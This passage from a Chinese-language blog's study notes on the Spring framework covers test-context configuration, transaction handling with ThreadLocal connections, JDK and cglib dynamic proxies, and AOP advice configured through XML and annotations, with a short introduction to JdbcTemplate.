<li>告知Spring的运行器，spring的ioc创建是基于xml还是注解，并说明位置<h3 id="ContextConfiguration（-告知Spring的运行器，spring的ioc创建是基于xml还是注解，并说明位置）"><a href="#ContextConfiguration（-告知Spring的运行器，spring的ioc创建是基于xml还是注解，并说明位置）" class="headerlink" title="ContextConfiguration（ 告知Spring的运行器，spring的ioc创建是基于xml还是注解，并说明位置）"></a>ContextConfiguration（ 告知Spring的运行器，spring的ioc创建是基于xml还是注解，并说明位置）</h3></li>
</ol>
</li>
<li>属性：<ul>
<li>location：指定xml位置加上classpath关键字，表示在类路径下</li>
<li>classes：指定注解类所在位置<br>当使用Spring5.x版本时，要求Junit版本4.12以上</li>
</ul>
</li>
</ul>
<h1 id="事务的一致性"><a href="#事务的一致性" class="headerlink" title="事务的一致性"></a>事务的一致性</h1><p>需要使用ThreadLocal对象把Connection和当前对象绑定，从而使一个线程中只有一个能控制事务的对象<br><img src="./transfer.png" alt="转账例子"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Account&gt; <span class="title">findAllAccount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//1.开启事务</span></span><br><span class="line">            transactionManager.beginTransaction();</span><br><span class="line">            <span class="comment">//2.执行操作</span></span><br><span class="line">            List&lt;Account&gt; accounts = accountDao.findAllAccount();</span><br><span class="line">            <span class="comment">//3.提交事务</span></span><br><span class="line">            transactionManager.commit();</span><br><span class="line">            <span class="comment">//4.返回结果</span></span><br><span class="line">            <span class="keyword">return</span> accounts;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">//5.回滚</span></span><br><span class="line">            transactionManager.rollback();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//6.释放</span></span><br><span class="line">            transactionManager.release();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>catch代码块直接e.printstack()的话，执行完后会往下继续执行，此处抛出异常(throw new RuntimeException(e);)，才能防止代码继续向下执行(return返回对象)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Account&gt; <span class="title">findAllAccount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> runner.query(connectionUtils.getThreadConnection(),<span class="string">"select * from account"</span>, <span class="keyword">new</span> BeanListHandler&lt;Account&gt;(Account.class));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>connectionUtils.getThreadConnection()</code>作为query()方法第一个参数<blockquote>
<p>connectionUtils类中，set方法注入DataSource。<br>可以通俗理解。Query原先是多例的，如果直接注入，每次都是一个新的bean，相当于多个连接在操作同一个数据库。而事物保证必须是单例，所以使用utils确保拿到的是同一个对象。<br>就是不用spring注入获得的连接，只用工具类创建和线程绑定的连接<br><strong>如果表是MyiSAM是不支持事务的</strong></p>
</blockquote>
</li>
</ul>
<h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><blockquote>
<p>当匿名内部类访问外部成员变量时候，外部变量要用final修饰（因为局部变量随着方法的调用而调用，随着方法消失而消失，而对内存的内容不会立即消失，还会继续引用局部变量）</p>
</blockquote>
<ul>
<li>动态代理<ul>
<li>特点：字节码随用随创建，随用随加载</li>
<li>作用：不修改源码的基础上，对方法增强</li>
<li>分类：<ul>
<li>基于接口的动态代理<ul>
<li>涉及的类：Proxy</li>
<li>提供者：JDK官方</li>
<li>如何创建代理对象：使用Proxy类中的<code>newProxyInstance()</code>方法</li>
<li>创建代理对象要求：被代理类最少实现一个接口，如果没有不能使用</li>
<li><code>newProxyInstance()</code>方法的参数<ul>
<li>ClassLoader：类加载器<ul>
<li>加载代理对象字节码，和被代理对象使用相同类加载器。固定写法：<code>xx.getClass().getClassLoader()</code></li>
</ul>
</li>
<li>Class[]：字节码数组<ul>
<li>用于让代理对象和被代理对象拥有相同方法。固定写法：<code>xxx.getClass().getInterfaces()</code></li>
</ul>
</li>
<li>InvocationHandler：用于提供增强的代码<ul>
<li>他是让我们写如何代理，我们一般都是写一个该接口的实现类，通常情况下都是匿名内部类但不必须。<ul>
<li>此接口实现类都是谁用谁写</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>基于子类的动态代理<ul>
<li>涉及的类：Enhancer</li>
<li>提供者：第三方cglib库</li>
<li>如何创建代理对象：使用Enhancer类中的<code>create()</code>方法</li>
<li>创建代理对象要求：被代理类不能是最终类</li>
<li><code>create()</code>方法的参数<ul>
<li>Class：指定一个字节码<ul>
<li>用于指定被代理对象的字节码。</li>
</ul>
</li>
<li>InvocationHandler：用于提供增强的代码<ul>
<li>他是让我们写如何代理，我们一般都是写一个该接口的实现类，通常情况下都是匿名内部类但不必须。</li>
<li>我们一般写的都是该接口的子接口实现类，<code>MethodIntercept</code><h2 id="基于接口的动态代理"><a href="#基于接口的动态代理" class="headerlink" title="基于接口的动态代理"></a>基于接口的动态代理</h2></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Producer p = <span class="keyword">new</span> Producer();</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 基于接口的动态代理</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Iproducer proxyProducer = (Iproducer) Proxy.newProxyInstance(p.getClass().getClassLoader(), p.getClass().getInterfaces(), <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 执行被代理对象的任何接口方法都会经过该方法</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> proxy 代理对象的引用，一般不用</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> method 当前执行的方法</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> args 当前执行方法所需的参数</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@return</span> 和被代理对象有相同返回值</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@throws</span> Throwable</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="comment">//提供增强代码</span></span><br><span class="line">                Object returnValue = <span class="keyword">null</span>;</span><br><span class="line">                <span class="comment">//1.获取方法执行的参数</span></span><br><span class="line">                Float money = (Float) args[<span class="number">0</span>];</span><br><span class="line">                <span class="comment">//2.判断当前方法是不是销售</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="string">"saleProduct"</span>.equals(method.getName())) &#123;</span><br><span class="line">                    returnValue = method.invoke(p, money * <span class="number">0.8f</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> returnValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        proxyProducer.saleProduct(<span class="number">12000f</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="基于子类的动态代理"><a href="#基于子类的动态代理" class="headerlink" title="基于子类的动态代理"></a>基于子类的动态代理</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Producer p = <span class="keyword">new</span> Producer();</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * 基于子类的动态代理</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Producer cglibP =(Producer) Enhancer.create(p.getClass(), <span class="keyword">new</span> MethodInterceptor() &#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 执行被代理对象的方法都会经过该方法</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> o</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> method</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> objects</span></span><br><span class="line"><span class="comment">             * 以上三个参数和基于接口的动态代理中invoke()方法的参数是一样的</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> methodProxy 当前执行方法的代理对象</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">             * <span class="doctag">@throws</span> Throwable</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">intercept</span><span class="params">(Object o, Method method, Object[] objects, MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="comment">//提供增强代码</span></span><br><span class="line">                Object returnValue = <span class="keyword">null</span>;</span><br><span class="line">                <span class="comment">//1.获取方法执行的参数</span></span><br><span class="line">                Float money = (Float) objects[<span class="number">0</span>];</span><br><span class="line">                <span class="comment">//2.判断当前方法是不是销售</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="string">"saleProduct"</span>.equals(method.getName())) &#123;</span><br><span class="line">                    returnValue = method.invoke(p, money * <span class="number">0.8f</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> returnValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        cglibP.saleProduct(<span class="number">12000f</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h1><p>面向切片编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术</p>
<ul>
<li>作用：在程序运行期间，不修改源码对已有方法增强。</li>
<li>优点：<pre><code>减少重复代码
提高开发效率
维护方便</code></pre><h2 id="AOP相关术语"><a href="#AOP相关术语" class="headerlink" title="AOP相关术语"></a>AOP相关术语</h2></li>
<li>JoinPoint：连接点是指那些被拦截到的点。在Spring中，这些点指的是方法，因为Spring只支持方法类型的连接点。</li>
<li>Pointcut：切入点是指我们要对哪些JoinPoint进行拦截的定义。（指被增强的方法）</li>
<li>Advice(通知/增强)：通知就是指拦截到的JoinPoint之后要做的事情。<br>  通知的类型：前置通知，后置通知，异常通知，最终通知，环绕通知。<br><img src="./%E9%80%9A%E7%9F%A5.png" alt="通知"></li>
<li>Introduction(引介)：是一种特殊的通知，在不修改类代码的前提下。Introduction可以在运行期为类动态地添加一些方法和字段。</li>
<li>Target(目标)：代理的目标对象</li>
<li>Weaving(织入)：把增强应用到目标对象来来创建新的代理对象的过程<br>  Spring采用动态代理织入，而Aspectt7采用编译器和类装载期织入。</li>
<li>Proxy：一个类被AOP织入增强后，就产生一个结果代理类</li>
<li>Aspect(切面)：是切入点和通知(引介)的结合</li>
</ul>
<h2 id="Spring基于AOP配置步骤"><a href="#Spring基于AOP配置步骤" class="headerlink" title="Spring基于AOP配置步骤"></a>Spring基于AOP配置步骤</h2><ol>
<li>把通知Bean也交给Spring</li>
<li>使用aop:config标签表明开始AOP配置</li>
<li>使用aop:aspect标签表明配置切面<ul>
<li>id属性：给切面提供一个唯一标识</li>
<li>ref属性：指定通知类bean的id</li>
</ul>
</li>
<li>在aop:aspect内部使用对应标签来配置通知类型<br>//现在的示例是让printLog方法在切入点方法之前执行，是前置通知<ul>
<li>aop:before 表示前置通知<ul>
<li>method属性：用于指定Logger类中哪个方法是前置通知</li>
<li>pointcut属性：用于指定切入点表达式。该表达式含义指的是对业务层哪些方法增强</li>
</ul>
</li>
<li>切入点表达式写法：<ul>
<li>关键字：execution(表达式)</li>
<li>表达式：访问修饰符 返回值 包名.包名.包名….类名.方法名(参数列表)</li>
<li>全通配写法：访问修饰符可以省略，<ul>
<li>返回值可用通配符，</li>
<li>包名可以使用通配符，有几个包就几个*，“..”表示当前包以及子包，</li>
<li>类名可以用通配符，</li>
<li>参数列表可以直接写数据类型<ul>
<li>基本类型直接写名称，</li>
<li>引用类型写包名.类名 java.lang.String</li>
<li>通配符表示任意类型</li>
<li>使用(..)表示有无参数均可，有参数为任意类型<h2 id="通知类型"><a href="#通知类型" class="headerlink" title="通知类型"></a>通知类型</h2></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<ul>
<li>前置通知<br>在切入点方法之前执行</li>
<li>后置通知<br>在切入点方法正常执行之后执行</li>
<li>异常通知<br>在切入点方法执行产生异常后执行</li>
<li>最终通知<br>无论切入点方法是否正常执行，都会在后面执行</li>
</ul>
<blockquote>
<p>后置通知和异常通知只能同时执行一个</p>
</blockquote>
<ul>
<li>old<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/aop/spring-aop.xsd"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    配置Spring的IOC，把Service对象配置进来--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span> <span class="attr">class</span>=<span class="string">"com.service.impl.AccountServiceimpl"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    配置Logger--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"Logger"</span> <span class="attr">class</span>=<span class="string">"com.utils.Logger"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    配置AOP--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        配置切面--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">id</span>=<span class="string">"logAdvice"</span> <span class="attr">ref</span>=<span class="string">"Logger"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            配置通知类型，并建立通知方法和切入点方法的关联--&gt;</span></span><br><span class="line">              <span class="comment">&lt;!--            前置通知 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">"beforePrintLog"</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">pointcut</span>=<span class="string">"execution(* com.service.impl.*.*(..))"</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:before</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--            后置通知--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:after-returning</span> <span class="attr">method</span>=<span class="string">"afterReturnPrintLog"</span></span></span><br><span class="line"><span class="tag">                                 <span class="attr">pointcut</span>=<span class="string">"execution(* com.service.impl.*.*(..))"</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:after-returning</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--            异常通知--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:after-throwing</span> <span class="attr">method</span>=<span class="string">"afterThrowingPrintLog"</span></span></span><br><span class="line"><span class="tag">                                <span class="attr">pointcut</span>=<span class="string">"execution(* com.service.impl.*.*(..))"</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:after-throwing</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--            后置通知--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">method</span>=<span class="string">"afterPrintLog"</span></span></span><br><span class="line"><span class="tag">                       <span class="attr">pointcut</span>=<span class="string">"execution(* com.service.impl.*.*(..))"</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:after</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>new<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--            前置通知 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">"beforePrintLog"</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">pointcut-ref</span>=<span class="string">"pt1"</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:before</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--            后置通知--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:after-returning</span> <span class="attr">method</span>=<span class="string">"afterReturnPrintLog"</span></span></span><br><span class="line"><span class="tag">                             <span class="attr">pointcut-ref</span>=<span class="string">"pt1"</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:after-returning</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--            异常通知--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:after-throwing</span> <span class="attr">method</span>=<span class="string">"afterThrowingPrintLog"</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">pointcut-ref</span>=<span class="string">"pt1"</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:after-throwing</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--            后置通知--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">method</span>=<span class="string">"afterPrintLog"</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">pointcut-ref</span>=<span class="string">"pt1"</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:after</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--            配置切入点表达式 id:用于指定表达式唯一标识，expression：表达式内容</span></span><br><span class="line"><span class="comment">                        此标签写在aop:aspect内部只能当前标签使用，写在外部则所有切面可用</span></span><br><span class="line"><span class="comment">                        //注意：约束要求：标签写在aop:aspect外部并写在切面之前而不是之后</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">"pt1"</span> <span class="attr">expression</span>=<span class="string">"execution(* com.service.impl.*.*(..))"</span>/&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Spring中的环绕通知"><a href="#Spring中的环绕通知" class="headerlink" title="Spring中的环绕通知"></a>Spring中的环绕通知</h3><ul>
<li><p>Spring中的环绕通知<br>他是Spring框架提供的可以在代码中手动控制增强方法何时执行的方式<br>前面的例子是通过配置。下图是通过代码<br><img src="./Spring%E4%B8%AD%E7%9A%84%E7%8E%AF%E7%BB%95%E9%80%9A%E7%9F%A5.png" alt="Spring中的环绕通知"></p>
</li>
<li><p>logger.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.ProceedingJoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 记录日志的工具类，里面提供了公共代码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span>(<span class="string">"Logger"</span>)</span><br><span class="line"><span class="meta">@Aspect</span><span class="comment">//表示当前类是切面类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//切入点</span></span><br><span class="line">    <span class="meta">@Pointcut</span>(<span class="string">"execution(* com.service.impl.*.*(..)))"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pt1</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 前置通知</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Before</span>(<span class="string">"pt1()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">beforePrintLog</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"前置通知Logger类中的printLog方法开始记录日志"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 后置通知</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@AfterReturning</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterReturnPrintLog</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"后置通知Logger类中的printLog方法开始记录日志"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 异常通知</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@AfterThrowing</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterThrowingPrintLog</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"异常通知Logger类中的printLog方法开始记录日志"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 最终通知</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@After</span>(<span class="string">"pt1()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPrintLog</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"最终通知Logger类中的printLog方法开始记录日志"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 环绕通知</span></span><br><span class="line"><span class="comment">     * 问题：</span></span><br><span class="line"><span class="comment">     * 当我们配置了环绕通知以后，切入点方法没有执行，而通知方法执行了</span></span><br><span class="line"><span class="comment">     * 分析：</span></span><br><span class="line"><span class="comment">     * 通过对比动态代理中环绕代码，发现动态代理中的环绕通知有明确的切入点方法调用比如invoke。</span></span><br><span class="line"><span class="comment">     * 解决：</span></span><br><span class="line"><span class="comment">     * Spring提供了一个接口：ProceedingJoinPoint，该接口有一个方法，proceed()，此方法相当于明确调用切入点方法。</span></span><br><span class="line"><span class="comment">     * 该接口可以作为环绕通知的方法参数，程序执行时，Spring框架会为我们提供该接口的实现类供我们使用</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Spring中的环绕通知</span></span><br><span class="line"><span class="comment">     *      他是Spring框架提供的可以在代码中手动控制增强方法何时执行的方式</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Around</span>(<span class="string">"pt1()"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  Object <span class="title">aroundPrintLog</span><span class="params">(ProceedingJoinPoint proceedingJoinPoint)</span></span>&#123;</span><br><span class="line">        Object returnValue = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Object args[] = proceedingJoinPoint.getArgs();<span class="comment">//得到方法的参数</span></span><br><span class="line">            System.out.println(<span class="string">"exec aroundPrintLog"</span>);<span class="comment">//前置通知</span></span><br><span class="line"></span><br><span class="line">            returnValue = proceedingJoinPoint.proceed();<span class="comment">//明确调用业务层方法(切入点)</span></span><br><span class="line">            System.out.println(<span class="string">"exec aroundPrintLog"</span>);<span class="comment">//后置通知</span></span><br><span class="line">            <span class="keyword">return</span>  returnValue;</span><br><span class="line">            <span class="comment">//这里不用Exception，拦不住该异常</span></span><br><span class="line">             &#125;<span class="keyword">catch</span> (Throwable t)&#123;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"exec aroundPrintLog"</span>);<span class="comment">//异常通知</span></span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"exec aroundPrintLog"</span>);<span class="comment">//最终通知</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> returnValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>bean.xml</p>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">"http://www.springframework.org/schema/aop"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/aop/spring-aop.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">        http://www.springframework.org/schema/context/spring-context.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    配置Spring创建容器时要扫描的包--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com"</span> &gt;</span><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--    配置Spring开启注解AOP的支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>&gt;</span><span class="tag">&lt;/<span class="name">aop:aspectj-autoproxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="./%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E5%BC%80%E5%90%AFAOP.png" alt="不使用注解开启AOP"></p>
<h1 id="JDBCTemplate"><a href="#JDBCTemplate" class="headerlink" title="JDBCTemplate"></a>JDBCTemplate</h1><p><img src="./%E6%8C%81%E4%B9%85%E5%B1%82%E6%80%BB%E5%9B%BE.png" alt="持久层总图"></p>
<ul>
<li>JDBCTemplate是Spring框架中提供的一个对象，是对原始JDBC API对象的简单封装。Spring框架为我们提供了很多的操作模板类</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
</search>
